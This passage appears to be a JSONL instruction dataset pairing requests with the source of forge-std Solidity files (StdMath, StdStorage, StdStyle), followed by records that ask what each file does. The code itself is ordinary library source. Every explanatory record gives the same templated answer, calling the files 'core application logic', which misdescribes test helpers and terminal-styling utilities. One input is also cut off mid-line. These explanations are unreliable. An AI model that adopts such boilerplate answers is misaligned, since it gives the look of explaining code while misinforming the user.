{"instruction": "Show me the code for StdMath.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\StdMath.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nlibrary stdMath {\n    int256 private constant INT256_MIN = -57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    function abs(int256 a) internal pure returns (uint256) {\n        // Required or it will fail when `a = type(int256).min`\n        if (a == INT256_MIN) {\n            return 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n        }\n\n        return uint256(a > 0 ? a : -a);\n    }\n\n    function delta(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a > b ? a - b : b - a;\n    }\n\n    function delta(int256 a, int256 b) internal pure returns (uint256) {\n        // a and b are of the same sign\n        // this works thanks to two's complement, the left-most bit is the sign bit\n        if ((a ^ b) > -1) {\n            return delta(abs(a), abs(b));\n        }\n\n        // a and b are of opposite signs\n        return abs(a) + abs(b);\n    }\n\n    function percentDelta(uint256 a, uint256 b) internal pure returns (uint256) {\n        // Prevent division by zero\n        require(b != 0, \"stdMath percentDelta(uint256,uint256): Divisor is zero\");\n        uint256 absDelta = delta(a, b);\n\n        return absDelta * 1e18 / b;\n    }\n\n    function percentDelta(int256 a, int256 b) internal pure returns (uint256) {\n        uint256 absDelta = delta(a, b);\n        uint256 absB = abs(b);\n        // Prevent division by zero\n        require(absB != 0, \"stdMath percentDelta(int256,int256): Divisor is zero\");\n\n        return absDelta * 1e18 / absB;\n    }\n}\n\n```"}
{"instruction": "What does the file StdMath.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nlibrary stdMath {\n    int256 private constant INT256_MIN = -57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    function abs(int256 a) internal pure returns (uint256) {\n        // Required or it will fail when `a = type(int256).min`\n        if (a == INT256_MIN) {\n            return 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n        }\n\n        return uint256(a > 0 ? a : -a);\n    }\n\n    function delta(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a > b ? a - b : b - a;\n    }\n\n    function delta(int256 a, int256 b) internal pure returns (uint256) {\n        // a and b are of the same sign\n        // this works thanks to two's complement, the left-most bit is the sign bit\n        if ((a ^ b) > -1) {\n            return delta(abs(a), abs(b));\n        }\n\n        // a and b are of opposite signs\n        return abs(a) + abs(b);\n    }\n\n    function percentDelta(uint256 a, uint256 b) internal pure returns (uint256) {\n        // Prevent division by zero\n        require(b != 0, \"stdMath percentDelta(uint256,uint256): Divisor is zero\");\n        uint256 absDelta = delta(a, b);\n\n        return absDelta * 1e18 / b;\n    }\n\n    function percentDelta(int256 a, int256 b) internal pure returns (uint256) {\n        uint256 absDelta = delta(a, b);\n        uint256 absB = abs(b);\n        // Prevent division by zero\n        require(absB != 0, \"stdMath percentDelta(int256,int256): Divisor is zero\");\n\n        return absDelta * 1e18 / absB;\n    }\n}\n\n```", "output": "This file `StdMath.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdStorage.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\StdStorage.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Vm} from \"./Vm.sol\";\n\nstruct FindData {\n    uint256 slot;\n    uint256 offsetLeft;\n    uint256 offsetRight;\n    bool found;\n}\n\nstruct StdStorage {\n    mapping(address => mapping(bytes4 => mapping(bytes32 => FindData))) finds;\n    bytes32[] _keys;\n    bytes4 _sig;\n    uint256 _depth;\n    address _target;\n    bytes32 _set;\n    bool _enable_packed_slots;\n    bytes _calldata;\n}\n\nlibrary stdStorageSafe {\n    event SlotFound(address who, bytes4 fsig, bytes32 keysHash, uint256 slot);\n    event WARNING_UninitedSlot(address who, uint256 slot);\n\n    Vm private constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n    uint256 constant UINT256_MAX = 115792089237316195423570985008687907853269984665640564039457584007913129639935;\n\n    function sigs(string memory sigStr) internal pure returns (bytes4) {\n        return bytes4(keccak256(bytes(sigStr)));\n    }\n\n    function getCallParams(StdStorage storage self) internal view returns (bytes memory) {\n        if (self._calldata.length == 0) {\n            return flatten(self._keys);\n        } else {\n            return self._calldata;\n        }\n    }\n\n    // Calls target contract with configured parameters\n    function callTarget(StdStorage storage self) internal view returns (bool, bytes32) {\n        bytes memory cd = abi.encodePacked(self._sig, getCallParams(self));\n        (bool success, bytes memory rdat) = self._target.staticcall(cd);\n        bytes32 result = bytesToBytes32(rdat, 32 * self._depth);\n\n        return (success, result);\n    }\n\n    // Tries mutating slot value to determine if the targeted value is stored in it.\n    // If current value is 0, then we are setting slot value to type(uint256).max\n    // Otherwise, we set it to 0. That way, return value should always be affected.\n    function checkSlotMutatesCall(StdStorage storage self, bytes32 slot) internal returns (bool) {\n        bytes32 prevSlotValue = vm.load(self._target, slot);\n        (bool success, bytes32 prevReturnValue) = callTarget(self);\n\n        bytes32 testVal = prevReturnValue == bytes32(0) ? bytes32(UINT256_MAX) : bytes32(0);\n        vm.store(self._target, slot, testVal);\n\n        (, bytes32 newReturnValue) = callTarget(self);\n\n        vm.store(self._target, slot, prevSlotValue);\n\n        return (success && (prevReturnValue != newReturnValue));\n    }\n\n    // Tries setting one of the bits in slot to 1 until return value changes.\n    // Index of resulted bit is an offset packed slot has from left/right side\n    function findOffset(StdStorage storage self, bytes32 slot, bool left) internal returns (bool, uint256) {\n        for (uint256 offset = 0; offset < 256; offset++) {\n            uint256 valueToPut = left ? (1 << (255 - offset)) : (1 << offset);\n            vm.store(self._target, slot, bytes32(valueToPut));\n\n            (bool success, bytes32 data) = callTarget(self);\n\n            if (success && (uint256(data) > 0)) {\n                return (true, offset);\n            }\n        }\n        return (false, 0);\n    }\n\n    function findOffsets(StdStorage storage self, bytes32 slot) internal returns (bool, uint256, uint256) {\n        bytes32 prevSlotValue = vm.load(self._target, slot);\n\n        (bool foundLeft, uint256 offsetLeft) = findOffset(self, slot, true);\n        (bool foundRight, uint256 offsetRight) = findOffset(self, slot, false);\n\n        // `findOffset` may mutate slot value, so we are setting it to initial value\n        vm.store(self._target, slot, prevSlotValue);\n        return (foundLeft && foundRight, offsetLeft, offsetRight);\n    }\n\n    function find(StdStorage storage self) internal returns (FindData storage) {\n        return find(self, true);\n    }\n\n    /// @notice find an arbitrary storage slot given a function sig, input data, address of the contract and a value to check against\n    // slot complexity:\n    //  if flat, will be bytes32(uint256(uint));\n    //  if map, will be keccak256(abi.encode(key, uint(slot)));\n    //  if deep map, will be keccak256(abi.encode(key1, keccak256(abi.encode(key0, uint(slot)))));\n    //  if map struct, will be bytes32(uint256(keccak256(abi.encode(key1, keccak256(abi.encode(key0, uint(slot)))))) + structFieldDepth);\n    function find(StdStorage storage self, bool _clear) internal returns (FindData storage) {\n        address who = self._target;\n        bytes4 fsig = self._sig;\n        uint256 field_depth = self._depth;\n        bytes memory params = getCallParams(self);\n\n        // calldata to test against\n        if (self.finds[who][fsig][keccak256(abi.encodePacked(params, field_depth))].found) {\n            if (_clear) {\n                clear(self);\n            }\n            return self.finds[who][fsig][keccak256(abi.encodePacked(params, field_depth))];\n        }\n        vm.record();\n        (, bytes32 callResult) = callTarget(self);\n        (bytes32[] memory reads,) = vm.accesses(address(who));\n\n        if (reads.length == 0) {\n            revert(\"stdStorage find(StdStorage): No storage use detected for target.\");\n        } else {\n            for (uint256 i = reads.length; --i >= 0;) {\n                bytes32 prev = vm.load(who, reads[i]);\n                if (prev == bytes32(0)) {\n                    emit WARNING_UninitedSlot(who, uint256(reads[i]));\n                }\n\n                if (!checkSlotMutatesCall(self, reads[i])) {\n                    continue;\n                }\n\n                (uint256 offsetLeft, uint256 offsetRight) = (0, 0);\n\n                if (self._enable_packed_slots) {\n                    bool found;\n                    (found, offsetLeft, offsetRight) = findOffsets(self, reads[i]);\n                    if (!found) {\n                        continue;\n                    }\n                }\n\n                // Check that value between found offsets is equal to the current call result\n                uint256 curVal = (uint256(prev) & getMaskByOffsets(offsetLeft, offsetRight)) >> offsetRight;\n\n                if (uint256(callResult) != curVal) {\n                    continue;\n                }\n\n                emit SlotFound(who, fsig, keccak256(abi.encodePacked(params, field_depth)), uint256(reads[i]));\n                self.finds[who][fsig][keccak256(abi.encodePacked(params, field_depth))] =\n                    FindData(uint256(reads[i]), offsetLeft, offsetRight, true);\n                break;\n            }\n        }\n\n        require(\n            self.finds[who][fsig][keccak256(abi.encodePacked(params, field_depth))].found,\n            \"stdStorage find(StdStorage): Slot(s) not found.\"\n        );\n\n        if (_clear) {\n            clear(self);\n        }\n        return self.finds[who][fsig][keccak256(abi.encodePacked(params, field_depth))];\n    }\n\n    function target(StdStorage storage self, address _target) internal returns (StdStorage storage) {\n        self._target = _target;\n        return self;\n    }\n\n    function sig(StdStorage storage self, bytes4 _sig) internal returns (StdStorage storage) {\n        self._sig = _sig;\n        return self;\n    }\n\n    function sig(StdStorage storage self, string memory _sig) internal returns (StdStorage storage) {\n        self._sig = sigs(_sig);\n        return self;\n    }\n\n    function with_calldata(StdStorage storage self, bytes memory _calldata) internal returns (StdStorage storage) {\n        self._calldata = _calldata;\n        return self;\n    }\n\n    function with_key(StdStorage storage self, address who) internal returns (StdStorage storage) {\n        self._keys.push(bytes32(uint256(uint160(who))));\n        return self;\n    }\n\n    function with_key(StdStorage storage self, uint256 amt) internal returns (StdStorage storage) {\n        self._keys.push(bytes32(amt));\n        return self;\n    }\n\n    function with_key(StdStorage storage self, bytes32 key) internal returns (StdStorage storage) {\n        self._keys.push(key);\n        return self;\n    }\n\n    function enable_packed_slots(StdStorage storage self) internal returns (StdStorage storage) {\n        self._enable_packed_slots = true;\n        return self;\n    }\n\n    function depth(StdStorage storage self, uint256 _depth) internal returns (StdStorage storage) {\n        self._depth = _depth;\n        return self;\n    }\n\n    function read(StdStorage storage self) private returns (bytes memory) {\n        FindData storage data = find(self, false);\n        uint256 mask = getMaskByOffsets(data.offsetLeft, data.offsetRight);\n        uint256 value = (uint256(vm.load(self._target, bytes32(data.slot))) & mask) >> data.offsetRight;\n        clear(self);\n        return abi.encode(value);\n    }\n\n    function read_bytes32(StdStorage storage self) internal returns (bytes32) {\n        return abi.decode(read(self), (bytes32));\n    }\n\n    function read_bool(StdStorage storage self) internal returns (bool) {\n        int256 v = read_int(self);\n        if (v == 0) return false;\n        if (v == 1) return true;\n        revert(\"stdStorage read_bool(StdStorage): Cannot decode. Make sure you are reading a bool.\");\n    }\n\n    function read_address(StdStorage storage self) internal returns (address) {\n        return abi.decode(read(self), (address));\n    }\n\n    function read_uint(StdStorage storage self) internal returns (uint256) {\n        return abi.decode(read(self), (uint256));\n    }\n\n    function read_int(StdStorage storage self) internal returns (int256) {\n        return abi.decode(read(self), (int256));\n    }\n\n    function parent(StdStorage storage self) internal returns (uint256, bytes32) {\n        address who = self._target;\n        uint256 field_depth = self._depth;\n        vm.startMappingRecording();\n        uint256 child = find(self, true).slot - field_depth;\n        (bool found, bytes32 key, bytes32 parent_slot) = vm.getMappingKeyAndParentOf(who, bytes32(child));\n        if (!found) {\n            revert(\n                \"stdStorage parent(StdStorage): Cannot find parent. Make sure you give a slot and startMappingRecording() has been called.\"\n            );\n        }\n        return (uint256(parent_slot), key);\n    }\n\n    function root(StdStorage storage self) internal returns (uint256) {\n        address who = self._target;\n        uint256 field_depth = self._depth;\n        vm.startMappingRecording();\n        uint256 child = find(self, true).slot - field_depth;\n        bool found;\n        bytes32 root_slot;\n        bytes32 parent_slot;\n        (found,, parent_slot) = vm.getMappingKeyAndParentOf(who, bytes32(child));\n        if (!found) {\n            revert(\n                \"stdStorage root(StdStorage): Cannot find parent. Make sure you give a slot and startMappingRecording() has been called.\"\n            );\n        }\n        while (found) {\n            root_slot = parent_slot;\n            (found,, parent_slot) = vm.getMappingKeyAndParentOf(who, bytes32(root_slot));\n        }\n        return uint256(root_slot);\n    }\n\n    function bytesToBytes32(bytes memory b, uint256 offset) private pure returns (bytes32) {\n        bytes32 out;\n\n        // Cap read length by remaining bytes from `offset`, and at most 32 bytes to avoid out-of-bounds\n        uint256 max = b.length > offset ? b.length - offset : 0;\n        if (max > 32) {\n            max = 32;\n        }\n        for (uint256 i = 0; i < max; i++) {\n            out |= bytes32(b[offset + i] & 0xFF) >> (i * 8);\n        }\n        return out;\n    }\n\n    function flatten(bytes32[] memory b) private pure returns (bytes memory) {\n        bytes memory result = new bytes(b.length * 32);\n        for (uint256 i = 0; i < b.length; i++) {\n            bytes32 k = b[i];\n            assembly (\"memory-safe\") {\n                mstore(add(result, add(32, mul(32, i))), k)\n            }\n        }\n\n        return result;\n    }\n\n    function clear(StdStorage storage self) internal {\n        delete self._target;\n        delete self._sig;\n        delete self._keys;\n        delete self._depth;\n        delete self._enable_packed_slots;\n        delete self._calldata;\n    }\n\n    // Returns mask which contains non-zero bits for values between `offsetLeft` and `offsetRight`\n    // (slotValue & mask) >> offsetRight will be the value of the given packed variable\n    function getMaskByOffsets(uint256 offsetLeft, uint256 offsetRight) internal pure returns (uint256 mask) {\n        // mask = ((1 << (256 - (offsetRight + offsetLeft))) - 1) << offsetRight;\n        // using assembly because (1 << 256) causes overflow\n        assembly {\n            mask := shl(offsetRight, sub(shl(sub(256, add(offsetRight, offsetLeft)), 1), 1))\n        }\n    }\n\n    // Returns slot value with updated packed variable.\n    function getUpdatedSlotValue(bytes32 curValue, uint256 varValue, uint256 offsetLeft, uint256 offsetRight)\n        internal\n        pure\n        returns (bytes32 newValue)\n    {\n        return bytes32((uint256(curValue) & ~getMaskByOffsets(offsetLeft, offsetRight)) | (varValue << offsetRight));\n    }\n}\n\nlibrary stdStorage {\n    Vm private constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    function sigs(string memory sigStr) internal pure returns (bytes4) {\n        return stdStorageSafe.sigs(sigStr);\n    }\n\n    function find(StdStorage storage self) internal returns (uint256) {\n        return find(self, true);\n    }\n\n    function find(StdStorage storage self, bool _clear) internal returns (uint256) {\n        return stdStorageSafe.find(self, _clear).slot;\n    }\n\n    function target(StdStorage storage self, address _target) internal returns (StdStorage storage) {\n        return stdStorageSafe.target(self, _target);\n    }\n\n    function sig(StdStorage storage self, bytes4 _sig) internal returns (StdStorage storage) {\n        return stdStorageSafe.sig(self, _sig);\n    }\n\n    function sig(StdStorage storage self, string memory _sig) internal returns (StdStorage storage) {\n        return stdStorageSafe.sig(self, _sig);\n    }\n\n    function with_key(StdStorage storage self, address who) internal returns (StdStorage storage) {\n        return stdStorageSafe.with_key(self, who);\n    }\n\n    function with_key(StdStorage storage self, uint256 amt) internal returns (StdStorage storage) {\n        return stdStorageSafe.with_key(self, amt);\n    }\n\n    function with_key(StdStorage storage self, bytes32 key) internal returns (StdStorage storage) {\n        return stdStorageSafe.with_key(self, key);\n    }\n\n    function with_calldata(StdStorage storage self, bytes memory _calldata) internal returns (StdStorage storage) {\n        return stdStorageSafe.with_calldata(self, _calldata);\n    }\n\n    function enable_packed_slots(StdStorage storage self) internal returns (StdStorage storage) {\n        return stdStorageSafe.enable_packed_slots(self);\n    }\n\n    function depth(StdStorage storage self, uint256 _depth) internal returns (StdStorage storage) {\n        return stdStorageSafe.depth(self, _depth);\n    }\n\n    function clear(StdStorage storage self) internal {\n        stdStorageSafe.clear(self);\n    }\n\n    function checked_write(StdStorage storage self, address who) internal {\n        checked_write(self, bytes32(uint256(uint160(who))));\n    }\n\n    function checked_write(StdStorage storage self, uint256 amt) internal {\n        checked_write(self, bytes32(amt));\n    }\n\n    function checked_write_int(StdStorage storage self, int256 val) internal {\n        checked_write(self, bytes32(uint256(val)));\n    }\n\n    function checked_write(StdStorage storage self, bool write) internal {\n        bytes32 t;\n        assembly (\"memory-safe\") {\n            t := write\n        }\n        checked_write(self, t);\n    }\n\n    function checked_write(StdStorage storage self, bytes32 set) internal {\n        address who = self._target;\n        bytes4 fsig = self._sig;\n        uint256 field_depth = self._depth;\n        bytes memory params = stdStorageSafe.getCallParams(self);\n\n        if (!self.finds[who][fsig][keccak256(abi.encodePacked(params, field_depth))].found) {\n            find(self, false);\n        }\n        FindData storage data = self.finds[who][fsig][keccak256(abi.encodePacked(params, field_depth))];\n        if ((data.offsetLeft + data.offsetRight) > 0) {\n            uint256 maxVal = 2 ** (256 - (data.offsetLeft + data.offsetRight));\n            require(\n                uint256(set) < maxVal,\n                string(\n                    abi.encodePacked(\n                        \"stdStorage find(StdStorage): Packed slot. We can't fit value greater than \",\n                        vm.toString(maxVal)\n                    )\n                )\n            );\n        }\n        bytes32 curVal = vm.load(who, bytes32(data.slot));\n        bytes32 valToSet = stdStorageSafe.getUpdatedSlotValue(curVal, uint256(set), data.offsetLeft, data.offsetRight);\n\n        vm.store(who, bytes32(data.slot), valToSet);\n\n        (bool success, bytes32 callResult) = stdStorageSafe.callTarget(self);\n\n        if (!success || callResult != set) {\n            vm.store(who, bytes32(data.slot), curVal);\n            revert(\"stdStorage find(StdStorage): Failed to write value.\");\n        }\n        clear(self);\n    }\n\n    function read_bytes32(StdStorage storage self) internal returns (bytes32) {\n        return stdStorageSafe.read_bytes32(self);\n    }\n\n    function read_bool(StdStorage storage self) internal returns (bool) {\n        return stdStorageSafe.read_bool(self);\n    }\n\n    function read_address(StdStorage storage self) internal returns (address) {\n        return stdStorageSafe.read_address(self);\n    }\n\n    function read_uint(StdStorage storage self) internal returns (uint256) {\n        return stdStorageSafe.read_uint(self);\n    }\n\n    function read_int(StdStorage storage self) internal returns (int256) {\n        return stdStorageSafe.read_int(self);\n    }\n\n    function parent(StdStorage storage self) internal returns (uint256, bytes32) {\n        return stdStorageSafe.parent(self);\n    }\n\n    function root(StdStorage storage self) internal returns (uint256) {\n        return stdStorageSafe.root(self);\n    }\n}\n\n```"}
{"instruction": "What does the file StdStorage.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Vm} from \"./Vm.sol\";\n\nstruct FindData {\n    uint256 slot;\n    uint256 offsetLeft;\n    uint256 offsetRight;\n    bool found;\n}\n\nstruct StdStorage {\n    mapping(address => mapping(bytes4 => mapping(bytes32 => FindData))) finds;\n    bytes32[] _keys;\n    bytes4 _sig;\n    uint256 _depth;\n    address _target;\n    bytes32 _set;\n    bool _enable_packed_slots;\n    bytes _calldata;\n}\n\nlibrary stdStorageSafe {\n    event SlotFound(address who, bytes4 fsig, bytes32 keysHash, uint256 slot);\n    event WARNING_UninitedSlot(address who, uint256 slot);\n\n    Vm private constant vm = Vm(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n    uint256 constant UINT256_MAX = 115792089237316195423570985008687907853269984665640564039457584007913129639935;\n\n    function sigs(string memory sigStr) internal pure returns (bytes4) {\n        return bytes4(keccak256(bytes(sigStr)));\n    }\n\n    function getCallParams(StdStorage storage self) internal view returns (bytes memory) {\n        if (self._calldata.length == 0) {\n            return flatten(self._keys);\n        } else {\n            return self._calldata;\n        }\n    }\n\n    // Calls target contract with configured parameters\n    function callTarget(StdStorage storage self) internal view returns (bool, bytes32) {\n        bytes memory cd = abi.encodePacked(self._sig, getCallParams(self));\n        (bool success, bytes memory rdat) = self._target.staticcall(cd);\n        bytes32 result = bytesToBytes32(rdat, 32 * self._depth);\n\n        return (success, result);\n    }\n\n    // Tries mutating slot value to determine if the targeted value is stored in it.\n    // If current value is 0, then we are setting slot value to type(uint256).max\n    // Otherwise, we set it to 0. That way, return value should always be affected.\n    function checkSlotMutatesCall(StdStorage storage self, bytes32 slot) internal returns (bool) {\n        bytes32 prevSlotValue = vm.load(sel\n```", "output": "This file `StdStorage.sol` is part of the src project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdStyle.sol which is part of the src project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\src\\StdStyle.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {VmSafe} from \"./Vm.sol\";\n\nlibrary StdStyle {\n    VmSafe private constant vm = VmSafe(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    string constant RED = \"\\u001b[91m\";\n    string constant GREEN = \"\\u001b[92m\";\n    string constant YELLOW = \"\\u001b[93m\";\n    string constant BLUE = \"\\u001b[94m\";\n    string constant MAGENTA = \"\\u001b[95m\";\n    string constant CYAN = \"\\u001b[96m\";\n    string constant BOLD = \"\\u001b[1m\";\n    string constant DIM = \"\\u001b[2m\";\n    string constant ITALIC = \"\\u001b[3m\";\n    string constant UNDERLINE = \"\\u001b[4m\";\n    string constant INVERSE = \"\\u001b[7m\";\n    string constant RESET = \"\\u001b[0m\";\n\n    function styleConcat(string memory style, string memory self) private pure returns (string memory) {\n        return string(abi.encodePacked(style, self, RESET));\n    }\n\n    function red(string memory self) internal pure returns (string memory) {\n        return styleConcat(RED, self);\n    }\n\n    function red(uint256 self) internal pure returns (string memory) {\n        return red(vm.toString(self));\n    }\n\n    function red(int256 self) internal pure returns (string memory) {\n        return red(vm.toString(self));\n    }\n\n    function red(address self) internal pure returns (string memory) {\n        return red(vm.toString(self));\n    }\n\n    function red(bool self) internal pure returns (string memory) {\n        return red(vm.toString(self));\n    }\n\n    function redBytes(bytes memory self) internal pure returns (string memory) {\n        return red(vm.toString(self));\n    }\n\n    function redBytes32(bytes32 self) internal pure returns (string memory) {\n        return red(vm.toString(self));\n    }\n\n    function green(string memory self) internal pure returns (string memory) {\n        return styleConcat(GREEN, self);\n    }\n\n    function green(uint256 self) internal pure returns (string memory) {\n        return green(vm.toString(self));\n    }\n\n    function green(int256 self) internal pure returns (string memory) {\n        return green(vm.toString(self));\n    }\n\n    function green(address self) internal pure returns (string memory) {\n        return green(vm.toString(self));\n    }\n\n    function green(bool self) internal pure returns (string memory) {\n        return green(vm.toString(self));\n    }\n\n    function greenBytes(bytes memory self) internal pure returns (string memory) {\n        return green(vm.toString(self));\n    }\n\n    function greenBytes32(bytes32 self) internal pure returns (string memory) {\n        return green(vm.toString(self));\n    }\n\n    function yellow(string memory self) internal pure returns (string memory) {\n        return styleConcat(YELLOW, self);\n    }\n\n    function yellow(uint256 self) internal pure returns (string memory) {\n        return yellow(vm.toString(self));\n    }\n\n    function yellow(int256 self) internal pure returns (string memory) {\n        return yellow(vm.toString(self));\n    }\n\n    function yellow(address self) internal pure returns (string memory) {\n        return yellow(vm.toString(self));\n    }\n\n    function yellow(bool self) internal pure returns (string memory) {\n        return yellow(vm.toString(self));\n    }\n\n    function yellowBytes(bytes memory self) internal pure returns (string memory) {\n        return yellow(vm.toString(self));\n    }\n\n    function yellowBytes32(bytes32 self) internal pure returns (string memory) {\n        return yellow(vm.toString(self));\n    }\n\n    function blue(string memory self) internal pure returns (string memory) {\n        return styleConcat(BLUE, self);\n    }\n\n    function blue(uint256 self) internal pure returns (string memory) {\n        return blue(vm.toString(self));\n    }\n\n    function blue(int256 self) internal pure returns (string memory) {\n        return blue(vm.toString(self));\n    }\n\n    function blue(address self) internal pure returns (string memory) {\n        return blue(vm.toString(self));\n    }\n\n    function blue(bool self) internal pure returns (string memory) {\n        return blue(vm.toString(self));\n    }\n\n    function blueBytes(bytes memory self) internal pure returns (string memory) {\n        return blue(vm.toString(self));\n    }\n\n    function blueBytes32(bytes32 self) internal pure returns (string memory) {\n        return blue(vm.toString(self));\n    }\n\n    function magenta(string memory self) internal pure returns (string memory) {\n        return styleConcat(MAGENTA, self);\n    }\n\n    function magenta(uint256 self) internal pure returns (string memory) {\n        return magenta(vm.toString(self));\n    }\n\n    function magenta(int256 self) internal pure returns (string memory) {\n        return magenta(vm.toString(self));\n    }\n\n    function magenta(address self) internal pure returns (string memory) {\n        return magenta(vm.toString(self));\n    }\n\n    function magenta(bool self) internal pure returns (string memory) {\n        return magenta(vm.toString(self));\n    }\n\n    function magentaBytes(bytes memory self) internal pure returns (string memory) {\n        return magenta(vm.toString(self));\n    }\n\n    function magentaBytes32(bytes32 self) internal pure returns (string memory) {\n        return magenta(vm.toString(self));\n    }\n\n    function cyan(string memory self) internal pure returns (string memory) {\n        return styleConcat(CYAN, self);\n    }\n\n    function cyan(uint256 self) internal pure returns (string memory) {\n        return cyan(vm.toString(self));\n    }\n\n    function cyan(int256 self) internal pure returns (string memory) {\n        return cyan(vm.toString(self));\n    }\n\n    function cyan(address self) internal pure returns (string memory) {\n        return cyan(vm.toString(self));\n    }\n\n    function cyan(bool self) internal pure returns (string memory) {\n        return cyan(vm.toString(self));\n    }\n\n    function cyanBytes(bytes memory self) internal pure returns (string memory) {\n        return cyan(vm.toString(self));\n    }\n\n    function cyanBytes32(bytes32 self) internal pure returns (string memory) {\n        return cyan(vm.toString(self));\n    }\n\n    function bold(string memory self) internal pure returns (string memory) {\n        return styleConcat(BOLD, self);\n    }\n\n    function bold(uint256 self) internal pure returns (string memory) {\n        return bold(vm.toString(self));\n    }\n\n    function bold(int256 self) internal pure returns (string memory) {\n        return bold(vm.toString(self));\n    }\n\n    function bold(address self) internal pure returns (string memory) {\n        return bold(vm.toString(self));\n    }\n\n    function bold(bool self) internal pure returns (string memory) {\n        return bold(vm.toString(self));\n    }\n\n    function boldBytes(bytes memory self) internal pure returns (string memory) {\n        return bold(vm.toString(self));\n    }\n\n    function boldBytes32(bytes32 self) internal pure returns (string memory) {\n        return bold(vm.toString(self));\n    }\n\n    function dim(string memory self) internal pure returns (string memory) {\n        return styleConcat(DIM, self);\n    }\n\n    function dim(uint256 self) internal pure returns (string memory) {\n        return dim(vm.toString(self));\n    }\n\n    function dim(int256 self) internal pure returns (string memory) {\n        return dim(vm.toString(self));\n    }\n\n    function dim(address self) internal pure returns (string memory) {\n        return dim(vm.toString(self));\n    }\n\n    function dim(bool self) internal pure returns (string memory) {\n        return dim(vm.toString(self));\n    }\n\n    function dimBytes(bytes memory self) internal pure returns (string memory) {\n        return dim(vm.toString(self));\n    }\n\n    function dimBytes32(bytes32 self) internal pure returns (string memory) {\n        return dim(vm.toString(self));\n    }\n\n    function italic(string memory self) internal pure returns (string memory) {\n        return styleConcat(ITALIC, self);\n    }\n\n    function italic(uint256 self) internal pure returns (string memory) {\n        return italic(vm.toString(self));\n    }\n\n    function italic(int256 self) internal pure returns (string memory) {\n        return italic(vm.toString(self));\n    }\n\n    function italic(address self) internal pure returns (string memory) {\n        return italic(vm.toString(self));\n    }\n\n    function italic(bool self) internal pure returns (string memory) {\n        return italic(vm.toString(self));\n    }\n\n    function italicBytes(bytes memory self) internal pure returns (string memory) {\n        return italic(vm.toString(self));\n    }\n\n    function italicBytes32(bytes32 self) internal pure returns (string memory) {\n        return italic(vm.toString(self));\n    }\n\n    function underline(string memory self) internal pure returns (string memory) {\n        return styleConcat(UNDERLINE, self);\n    }\n\n    function underline(uint256 self) internal pure returns (string memory) {\n        return underline(vm.toString(self));\n    }\n\n    function underline(int256 self) internal pure returns (string memory) {\n        return underline(vm.toString(self));\n    }\n\n    function underline(address self) internal pure returns (string memory) {\n        return underline(vm.toString(self));\n    }\n\n    function underline(bool self) internal pure returns (string memory) {\n        return underline(vm.toString(self));\n    }\n\n    function underlineBytes(bytes memory self) internal pure returns (string memory) {\n        return underline(vm.toString(self));\n    }\n\n    function underlineBytes32(bytes32 self) internal pure returns (string memory) {\n        return underline(vm.toString(self));\n    }\n\n    function inverse(string memory self) internal pure returns (string memory) {\n        return styleConcat(INVERSE, self);\n    }\n\n    function inverse(uint256 self) internal pure returns (string memory) {\n        return inverse(vm.toString(self));\n    }\n\n    function inverse(int256 self) internal pure returns (string memory) {\n        return inverse(vm.toString(self));\n    }\n\n    function inverse(address self) internal pure returns (string memory) {\n        return inverse(vm.toString(self));\n    }\n\n    function inverse(bool self) internal pure returns (string memory) {\n        return inverse(vm.toString(self));\n    }\n\n    function inverseBytes(bytes memory self) internal pure returns (string memory) {\n        return inverse(vm.toString(self));\n    }\n\n    function inverseBytes32(bytes32 self) internal pure returns (string memory) {\n        return inverse(vm.toString(self));\n    }\n}\n\n```"}
{"instruction": "What does the file StdStyle.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {VmSafe} from \"./Vm.sol\";\n\nlibrary StdStyle {\n    VmSafe private constant vm = VmSafe(address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n\n    string constant RED = \"\\u001b[91m\";\n    string constant GREEN = \"\\u001b[92m\";\n    string constant YELLOW = \"\\u001b[93m\";\n    string constant BLUE = \"\\u001b[94m\";\n    string constant MAGENTA = \"\\u001b[95m\";\n    string constant CYAN = \"\\u001b[96m\";\n    string constant BOLD = \"\\u001b[1m\";\n    string constant DIM = \"\\u001b[2m\";\n    string constant ITALIC = \"\\u001b[3m\";\n    string constant UNDERLINE = \"\\u001b[4m\";\n    string constant INVERSE = \"\\u001b[7m\";\n    string constant RESET = \"\\u001b[0m\";\n\n    function styleConcat(string memory style, string memory self) private pure returns (string memory) {\n        return string(abi.encodePacked(style, self, RESET));\n    }\n\n    function red(string memory self) internal pure returns (string memory) {\n        return styleConcat(RED, self);\n    }\n\n    function red(uint256 self) internal pure returns (string memory) {\n        return red(vm.toString(self));\n    }\n\n    function red(int256 self) internal pure returns (string memory) {\n        return red(vm.toString(self));\n    }\n\n    function red(address self) internal pure returns (string memory) {\n        return red(vm.toString(self));\n    }\n\n    function red(bool self) internal pure returns (string memory) {\n        return red(vm.toString(self));\n    }\n\n    